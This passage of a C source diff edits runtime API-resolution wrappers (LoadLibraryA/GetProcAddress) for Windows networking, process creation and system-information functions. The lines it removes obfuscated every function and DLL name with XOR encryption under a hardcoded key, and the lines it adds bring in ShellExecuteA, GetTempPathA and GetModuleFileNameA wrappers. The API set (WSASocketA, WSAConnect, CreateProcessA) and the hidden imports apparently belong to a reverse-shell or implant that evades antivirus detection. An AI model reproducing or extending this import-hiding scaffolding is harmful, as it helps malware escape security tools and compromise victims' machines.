 HINTERNET ProxyHttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) {
     typedef HINTERNET (WINAPI* pHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
+    char funcName_utka[] = "HttpOpenRequestA";
+    char name_dll_utka[] = "wininet.dll";
     
-    // char funcName[] = { 'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A','\0' };
-    char funcName[17] = {0x1E, 0x37, 0x33, 0x24, 0x0A, 0x21, 0x36, 0x22, 0x14, 0x29, 0x20, 0x39, 0x36, 0x37, 0x38, 0x07, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-    
-    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
-    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hWinInet = LoadLibraryA(name_dll);
-    pHttpOpenRequestA HttpOpenRequestAFunc = (pHttpOpenRequestA)GetProcAddress(hWinInet, funcName);
+    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
+    pHttpOpenRequestA HttpOpenRequestAFunc = (pHttpOpenRequestA)GetProcAddress(hWinInet, funcName_utka);
     if (HttpOpenRequestAFunc != NULL) {
         return HttpOpenRequestAFunc(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
     } else {
@@ -487,18 +358,11 @@ HINTERNET ProxyHttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpsz
 WINBOOL ProxyHttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) {
     typedef WINBOOL (WINAPI* pHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','A','\0' };
-    char funcName[17] = {0x1E, 0x37, 0x33, 0x24, 0x16, 0x34, 0x3D, 0x28, 0x14, 0x29, 0x20, 0x39, 0x36, 0x37, 0x38, 0x07, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
+    char funcName_utka[] = "HttpSendRequestA";
+    char name_dll_utka[] = "wininet.dll";
     
-    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
-    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hWinInet = LoadLibraryA(name_dll);
-    pHttpSendRequestA HttpSendRequestAFunc = (pHttpSendRequestA)GetProcAddress(hWinInet, funcName);
+    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
+    pHttpSendRequestA HttpSendRequestAFunc = (pHttpSendRequestA)GetProcAddress(hWinInet, funcName_utka);
     if (HttpSendRequestAFunc != NULL) {
         return HttpSendRequestAFunc(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
     } else {
@@ -512,18 +376,11 @@ WINBOOL ProxyHttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHe
 WINBOOL ProxyInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
     typedef WINBOOL (WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0' };
-    char funcName[17] = {0x1F, 0x2D, 0x33, 0x31, 0x37, 0x3F, 0x36, 0x38, 0x14, 0x29, 0x30, 0x28, 0x15, 0x2D, 0x20, 0x23, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
-    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "InternetReadFile";
+    char name_dll_utka[] = "wininet.dll";
     
-    HMODULE hWinInet = LoadLibraryA(name_dll);
-    pInternetReadFile InternetReadFileFunc = (pInternetReadFile)GetProcAddress(hWinInet, funcName);
+    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
+    pInternetReadFile InternetReadFileFunc = (pInternetReadFile)GetProcAddress(hWinInet, funcName_utka);
     if (InternetReadFileFunc != NULL) {
         return InternetReadFileFunc(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
     } else {
@@ -537,18 +394,11 @@ WINBOOL ProxyInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOf
 WINBOOL ProxyInternetCloseHandle(HINTERNET hInternet) {
     typedef WINBOOL(WINAPI* pInternetCloseHandle)(HINTERNET);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0' };
-    char funcName[20] = {0x1F, 0x2D, 0x33, 0x31, 0x37, 0x3F, 0x36, 0x38, 0x05, 0x20, 0x3E, 0x3F, 0x36, 0x0C, 0x2D, 0x28, 0x34, 0x20, 0x21, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
-    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "InternetCloseHandle";
+    char name_dll_utka[] = "wininet.dll";
     
-    HMODULE hWinInet = LoadLibraryA(name_dll);
-    pInternetCloseHandle InternetCloseHandleFunc = (pInternetCloseHandle)GetProcAddress(hWinInet, funcName);
+    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
+    pInternetCloseHandle InternetCloseHandleFunc = (pInternetCloseHandle)GetProcAddress(hWinInet, funcName_utka);
     if (InternetCloseHandleFunc != NULL) {
         return InternetCloseHandleFunc(hInternet);
     } else {
@@ -562,18 +412,11 @@ WINBOOL ProxyInternetCloseHandle(HINTERNET hInternet) {
 WINBOOL ProxyGetComputerNameA(LPSTR lpBuffer, LPDWORD nSize) {
     typedef WINBOOL(WINAPI* pGetComputerNameA)(LPSTR, LPDWORD);
 
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A','\0' };
-    char funcName[17] = {0x11, 0x26, 0x33, 0x17, 0x2A, 0x3C, 0x23, 0x39, 0x32, 0x29, 0x23, 0x02, 0x32, 0x29, 0x29, 0x07, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[13] = {0x3D, 0x26, 0x35, 0x3A, 0x20, 0x3D, 0x60, 0x7E, 0x68, 0x28, 0x3D, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "GetComputerNameA";
+    char name_dll_utka[] = "kernel32.dll";
     
-    HMODULE hKernel32 = LoadLibraryA(name_dll);
-    pGetComputerNameA GetComputerNameAFunc = (pGetComputerNameA)GetProcAddress(hKernel32, funcName);
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pGetComputerNameA GetComputerNameAFunc = (pGetComputerNameA)GetProcAddress(hKernel32, funcName_utka);
     if (GetComputerNameAFunc != NULL) {
         return GetComputerNameAFunc(lpBuffer, nSize);
     } else {
@@ -587,18 +430,11 @@ WINBOOL ProxyGetComputerNameA(LPSTR lpBuffer, LPDWORD nSize) {
 int ProxyWSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData) {
     typedef int(WINAPI* pWSAStartup)(WORD, LPWSADATA);
 
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'W','S','A','S','t','a','r','t','u','p','\0' };
-    char funcName[11] = {0x01, 0x10, 0x06, 0x07, 0x31, 0x30, 0x21, 0x38, 0x33, 0x3C, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
+    char funcName_utka[] = "WSAStartup";
+    char name_dll_utka[] = "ws2_32.dll";
     
-    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hWs2_32 = LoadLibraryA(name_dll);
-    pWSAStartup WSAStartupFunc = (pWSAStartup)GetProcAddress(hWs2_32, funcName);
+    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
+    pWSAStartup WSAStartupFunc = (pWSAStartup)GetProcAddress(hWs2_32, funcName_utka);
     if (WSAStartupFunc != NULL) {
         return WSAStartupFunc(wVersionRequested, lpWSAData);
     } else {
@@ -612,18 +448,11 @@ int ProxyWSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData) {
 SOCKET ProxyWSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfoA, GROUP g, DWORD dwFlags) {
     typedef SOCKET(WINAPI* pWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'W','S','A','S','o','c','k','e','t','A','\0' };
-    char funcName[11] = {0x01, 0x10, 0x06, 0x07, 0x2A, 0x32, 0x38, 0x29, 0x32, 0x0D, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
+    char funcName_utka[] = "WSASocketA";
+    char name_dll_utka[] = "ws2_32.dll";
     
-    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hWs2_32 = LoadLibraryA(name_dll);
-    pWSASocketA WSASocketAFunc = (pWSASocketA)GetProcAddress(hWs2_32, funcName);
+    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
+    pWSASocketA WSASocketAFunc = (pWSASocketA)GetProcAddress(hWs2_32, funcName_utka);
     if (WSASocketAFunc != NULL) {
         return WSASocketAFunc(af, type, protocol, lpProtocolInfoA, g, dwFlags);
     } else {
@@ -637,18 +466,11 @@ SOCKET ProxyWSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpPro
 struct hostent *Proxy_gethostbyname(const char *name) {
     typedef struct hostent *(WINAPI* p_gethostbyname)(const char *);
 
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'g','e','t','h','o','s','t','b','y','n','a','m','e','\0' };
-    char funcName[14] = {0x31, 0x26, 0x33, 0x3C, 0x2A, 0x22, 0x27, 0x2E, 0x3F, 0x22, 0x30, 0x21, 0x36, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "gethostbyname";
+    char name_dll_utka[] = "ws2_32.dll";
     
-    HMODULE hWs2_32 = LoadLibraryA(name_dll);
-    p_gethostbyname gethostbynameFunc = (p_gethostbyname)GetProcAddress(hWs2_32, funcName);
+    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
+    p_gethostbyname gethostbynameFunc = (p_gethostbyname)GetProcAddress(hWs2_32, funcName_utka);
     if (gethostbynameFunc != NULL) {
         return gethostbynameFunc(name);
     } else {
@@ -662,18 +484,11 @@ struct hostent *Proxy_gethostbyname(const char *name) {
 char *Proxy_inet_ntoa(struct in_addr in) {
     typedef char *(WINAPI* p_inet_ntoa)();
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'i','n','e','t','_','n','t','o','a','\0' };
-    char funcName[10] = {0x3F, 0x2D, 0x22, 0x20, 0x1A, 0x3F, 0x27, 0x23, 0x27, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "inet_ntoa";
+    char name_dll_utka[] = "ws2_32.dll";
     
-    HMODULE hWs2_32 = LoadLibraryA(name_dll);
-    p_inet_ntoa inet_ntoaFunc = (p_inet_ntoa)GetProcAddress(hWs2_32, funcName);
+    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
+    p_inet_ntoa inet_ntoaFunc = (p_inet_ntoa)GetProcAddress(hWs2_32, funcName_utka);
     if (inet_ntoaFunc != NULL) {
         return inet_ntoaFunc(in);
     } else {
@@ -687,18 +502,11 @@ char *Proxy_inet_ntoa(struct in_addr in) {
 u_short Proxy_htons(u_short hostshort) {
     typedef u_short (WINAPI* p_htons)(u_short);
 
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    //char funcName[] = { 'h','t','o','n','s','\0' };
-    char funcName[6] = {0x3E, 0x37, 0x28, 0x3A, 0x36, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
+    char funcName_utka[] = "htons";
+    char name_dll_utka[] = "ws2_32.dll";
     
-    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hWs2_32 = LoadLibraryA(name_dll);
-    p_htons htonsFunc = (p_htons)GetProcAddress(hWs2_32, funcName);
+    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
+    p_htons htonsFunc = (p_htons)GetProcAddress(hWs2_32, funcName_utka);
     if (htonsFunc != NULL) {
         return htonsFunc(hostshort);
     } else {
@@ -711,18 +519,11 @@ u_short Proxy_htons(u_short hostshort) {
 int Proxy_atoi(const char *_Str) {
     typedef int(WINAPI* p_atoi)(const char *);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
+    char funcName_utka[] = "atoi";
+    char name_dll_utka[] = "msvcrt.dll";
     
-    // char funcName[] = { 'a','t','o','i','\0' };
-    char funcName[5] = {0x37, 0x37, 0x28, 0x3D, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-    
-    // char name_dll[] = { 'm','s','v','c','r','t','.','d','l','l','\0' };
-    char name_dll[11] = {0x3B, 0x30, 0x31, 0x37, 0x37, 0x25, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-
-    HMODULE hMsvcrt = LoadLibraryA(name_dll);
-    p_atoi atoiFunc = (p_atoi)GetProcAddress(hMsvcrt, funcName);
+    HMODULE hMsvcrt = LoadLibraryA(name_dll_utka);
+    p_atoi atoiFunc = (p_atoi)GetProcAddress(hMsvcrt, funcName_utka);
     if (atoiFunc != NULL) {
         return atoiFunc(_Str);
     } else {
@@ -736,18 +537,11 @@ int Proxy_atoi(const char *_Str) {
 unsigned long Proxy_inet_addr(const char *cp) {
     typedef unsigned long(WINAPI* p_inet_addr)(const char *);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
+    char funcName_utka[] = "inet_addr";
+    char name_dll_utka[] = "ws2_32.dll";
     
-    // char funcName[] = { 'i','n','e','t','_','a','d','d','r','\0' };
-    char funcName[11] = {0x3F, 0x2D, 0x22, 0x20, 0x1A, 0x30, 0x37, 0x28, 0x34, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hWs2_32 = LoadLibraryA(name_dll);
-    p_inet_addr inet_addrFunc = (p_inet_addr)GetProcAddress(hWs2_32, funcName);
+    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
+    p_inet_addr inet_addrFunc = (p_inet_addr)GetProcAddress(hWs2_32, funcName_utka);
     if (inet_addrFunc != NULL) {
         return inet_addrFunc(cp);
     } else {
@@ -761,18 +555,11 @@ unsigned long Proxy_inet_addr(const char *cp) {
 int Proxy_WSAConnect(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS) {
     typedef int(WINAPI* pWSAConnect)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'W','S','A','C','o','n','n','e','c','t','\0' };
-    char funcName[11] = {0x01, 0x10, 0x06, 0x17, 0x2A, 0x3F, 0x3D, 0x29, 0x25, 0x38, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    //char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "WSAConnect";
+    char name_dll_utka[] = "ws2_32.dll";
     
-    HMODULE hWs2_32 = LoadLibraryA(name_dll);
-    pWSAConnect WSAConnectFunc = (pWSAConnect)GetProcAddress(hWs2_32, funcName);
+    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
+    pWSAConnect WSAConnectFunc = (pWSAConnect)GetProcAddress(hWs2_32, funcName_utka);
     if (WSAConnectFunc != NULL) {
         return WSAConnectFunc(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS);
     } else {
@@ -786,18 +573,11 @@ int Proxy_WSAConnect(SOCKET s, const struct sockaddr *name, int namelen, LPWSABU
 void *Proxy_memset(void *_Dst, int _Val, size_t _Size) {
     typedef void *(WINAPI* p_memset)(void *, int, size_t);
 
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'm','e','m','s','e','t','\0' };
-    char funcName[7] = {0x3B, 0x26, 0x2A, 0x27, 0x20, 0x25, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
+    char funcName_utka[] = "memset";
+    char name_dll_utka[] = "msvcrt.dll";
     
-    // char name_dll[] = { 'm','s','v','c','r','t','.','d','l','l','\0' };
-    char name_dll[11] = {0x3B, 0x30, 0x31, 0x37, 0x37, 0x25, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-
-    HMODULE hMsvcrt = LoadLibraryA(name_dll);
-    p_memset memsetFunc = (p_memset)GetProcAddress(hMsvcrt, funcName);
+    HMODULE hMsvcrt = LoadLibraryA(name_dll_utka);
+    p_memset memsetFunc = (p_memset)GetProcAddress(hMsvcrt, funcName_utka);
     if (memsetFunc != NULL) {
         return memsetFunc(_Dst, _Val, _Size);
     } else {
@@ -811,18 +591,11 @@ void *Proxy_memset(void *_Dst, int _Val, size_t _Size) {
 BOOL ProxyCreateProcessA(LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
     typedef BOOL(WINAPI* pCreateProcessA)(LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
+    char funcName_utka[] = "CreateProcessA";
+    char name_dll_utka[] = "kernel32.dll";
     
-    //char funcName[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0' };
-    char funcName[15] = {0x15, 0x31, 0x22, 0x35, 0x31, 0x34, 0x03, 0x3E, 0x29, 0x2F, 0x34, 0x3F, 0x20, 0x05, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    //char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[13] = {0x3D, 0x26, 0x35, 0x3A, 0x20, 0x3D, 0x60, 0x7E, 0x68, 0x28, 0x3D, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hKernel32 = LoadLibraryA(name_dll);
-    pCreateProcessA CreateProcessAFunc = (pCreateProcessA)GetProcAddress(hKernel32, funcName);
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pCreateProcessA CreateProcessAFunc = (pCreateProcessA)GetProcAddress(hKernel32, funcName_utka);
     if (CreateProcessAFunc != NULL) {
         return CreateProcessAFunc(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
     } else {
@@ -836,26 +609,69 @@ BOOL ProxyCreateProcessA(LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECU
 WINBOOL ProxyGetCursorPos(LPPOINT lpPoint) {
     typedef WINBOOL(WINAPI* pGetCursorPos)(LPPOINT);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'G','e','t','C','u','r','s','o','r','P','o','s','\0' };
-    char funcName[13] = {0x11, 0x26, 0x33, 0x17, 0x30, 0x23, 0x20, 0x23, 0x34, 0x1C, 0x3E, 0x3F, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
+    char funcName_utka[] = "GetCursorPos";
+    char name_dll_utka[] = "user32.dll";
     
-    // char name_dll[] = { 'u','s','e','r','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x23, 0x30, 0x22, 0x26, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-
-    HMODULE hUser32 = LoadLibraryA(name_dll);
-    pGetCursorPos GetCursorPosFunc = (pGetCursorPos)GetProcAddress(hUser32, funcName);
+    HMODULE hUser32 = LoadLibraryA(name_dll_utka);
+    pGetCursorPos GetCursorPosFunc = (pGetCursorPos)GetProcAddress(hUser32, funcName_utka);
     if (GetCursorPosFunc != NULL) {
-        GetCursorPosFunc(lpPoint);
+        return GetCursorPosFunc(lpPoint);
     } else {
         // printf("Error: GetCursorPos function not found!\n");
         exit(1);
     }
     FreeLibrary(hUser32);
+}
 
+DWORD ProxyGetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize) {
+    typedef DWORD(WINAPI* pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
+
+    char funcName_utka[] = "GetModuleFileNameA";
+    char name_dll_utka[] = "kernel32.dll";
+
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pGetModuleFileNameA GetModuleFileNameAFunc = (pGetModuleFileNameA)GetProcAddress(hKernel32, funcName_utka);
+    if (GetModuleFileNameAFunc != NULL) {
+        return GetModuleFileNameAFunc(hModule, lpFilename, nSize);
+    } else {
+        // printf("Error: GetModuleFileNameA function not found!\n");
+        exit(1);
+    }
+    FreeLibrary(hKernel32);
+}
+
+DWORD ProxyGetTempPathA(DWORD nBufferLength, LPSTR lpBuffer) {
+    typedef DWORD(WINAPI* pGetTempPathA)(DWORD, LPSTR);
+
+    char funcName_utka[] = "GetTempPathA";
+    char name_dll_utka[] = "kernel32.dll";
+
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pGetTempPathA GetTempPathAFunc = (pGetTempPathA)GetProcAddress(hKernel32, funcName_utka);
+    if (GetTempPathAFunc != NULL) {
+        return GetTempPathAFunc(nBufferLength, lpBuffer);
+    } else {
+        // printf("Error: GetTempPathA function not found!\n");
+        exit(1);
+    }
+    FreeLibrary(hKernel32);
+}
+
+HINSTANCE ProxyShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd) {
+    typedef HINSTANCE(WINAPI* pShellExecute)(HWND, LPCSTR, LPCSTR , LPCSTR, LPCSTR, INT);
+
+    char funcName_utka[] = "ShellExecuteA";
+    char name_dll_utka[] = "shell32.dll";
+
+    HMODULE hShell32 = LoadLibraryA(name_dll_utka);
+    pShellExecute ShellExecuteAFunc = (pShellExecute)GetProcAddress(hShell32, funcName_utka);
+    if (ShellExecuteAFunc != NULL) {
+        return ShellExecuteAFunc(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd);
+    } else {
+        // printf("Error: ShellExecuteA function not found!\n");
+        exit(1);
+    }
+    FreeLibrary(hShell32);
 }
 
 #endif
